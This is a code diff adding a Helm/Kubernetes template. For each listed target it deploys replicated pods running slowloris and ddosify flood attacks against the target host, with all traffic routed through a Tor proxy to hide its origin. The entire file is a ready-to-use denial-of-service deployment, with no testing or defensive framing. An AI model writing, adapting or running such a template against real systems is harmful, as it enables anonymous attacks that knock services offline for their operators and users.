@@ -1,0 +1,62 @@
+{{- range $name, $target := .Values.targets }}
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: {{ include "runners.fullname" $ }}-{{ $name }}
+  labels:
+    {{- include "runners.labels" $ | nindent 4 }}-{{ $name }}
+spec:
+  {{- if not $target.autoscaling.enabled }}
+  replicas: {{ $target.replicaCount | default 1 }}
+  {{- end }}
+  selector:
+    matchLabels:
+      {{- include "runners.selectorLabels" $ | nindent 6 }}-{{ $name }}
+  template:
+    metadata:
+      {{- with $target.podAnnotations }}
+      annotations:
+        {{- toYaml . | nindent 8 }}
+      {{- end }}
+      labels:
+        {{- include "runners.selectorLabels" $ | nindent 8 }}-{{ $name }}
+    spec:
+      {{- with $.Values.imagePullSecrets }}
+      imagePullSecrets:
+        {{- toYaml . | nindent 8 }}
+      {{- end }}
+      containers:
+        {{- if $target.slowloris.enabled }}
+        - name: {{ $.Chart.Name }}-slowloris
+          image: "{{ $.Values.slowloris.image.repository }}:{{ $.Values.slowloris.image.tag }}"
+          imagePullPolicy: {{ $.Values.slowloris.image.pullPolicy }}
+          command:
+            - |
+              -x --proxy-host {{ $.Values.tor.host }} --proxy-port {{ $.Values.tor.socksPort }} {{ if $target.slowloris.https }}--https{{ end }} -ua --port {{ $target.port | default "443" }} {{ $target.host }}
+          resources:
+            {{- toYaml $target.slowloris.resources | nindent 12 }}
+        {{- end }}
+        {{- if $target.ddosify.enabled }}
+        - name: {{ $.Chart.Name }}-ddosify
+          image: "{{ $.Values.ddosify.image.repository }}:{{ $.Values.ddosify.image.tag }}"
+          imagePullPolicy: {{ $.Values.ddosify.image.pullPolicy }}
+          command:
+            - |
+              ddosify -P http://{{ $.Values.tor.host }}:{{ $.Values.tor.proxyPort }} -p {{ $target.ddosify.protocol | default "HTTPS" }} -t {{ $target.host }}
+          resources:
+            {{- toYaml $target.ddosify.resources | nindent 12 }}
+        {{- end }}
+      {{- with $target.nodeSelector }}
+      nodeSelector:
+        {{- toYaml . | nindent 8 }}
+      {{- end }}
+      {{- with $target.affinity }}
+      affinity:
+        {{- toYaml . | nindent 8 }}
+      {{- end }}
+      {{- with $target.tolerations }}
+      tolerations:
+        {{- toYaml . | nindent 8 }}
+      {{- end }}
+{{- end }}
